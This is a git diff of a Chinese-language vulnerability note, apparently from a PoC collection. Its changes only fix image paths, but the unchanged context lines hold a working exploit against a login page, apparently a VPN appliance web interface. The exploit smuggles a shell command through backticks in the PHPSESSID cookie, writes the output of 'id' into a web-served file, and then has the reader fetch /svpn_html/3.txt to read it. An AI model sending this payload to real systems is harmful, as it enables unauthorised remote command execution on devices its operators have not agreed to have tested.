@@ -18,7 +18,7 @@
 
 登陆页面
 
-![image-20231115101204343](images/image-20231115101204343.png)
+![image-20231115101204343](../.gitbook/assets/image-20231115101204343.png)
 
 poc
 
@@ -33,11 +33,10 @@ Cookie: PHPSESSID=`$(id > /fwlib/sys/virus/webui/svpn_html/3.txt)`;
 {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "NSLB" , "privacy_enable": "0"}}
 ```
 
-![image-20231115101222783](images/image-20231115101222783.png)
+![image-20231115101222783](../.gitbook/assets/image-20231115101222783.png)
 
 访问
 
 ```
 /svpn_html/3.txt
 ```
-
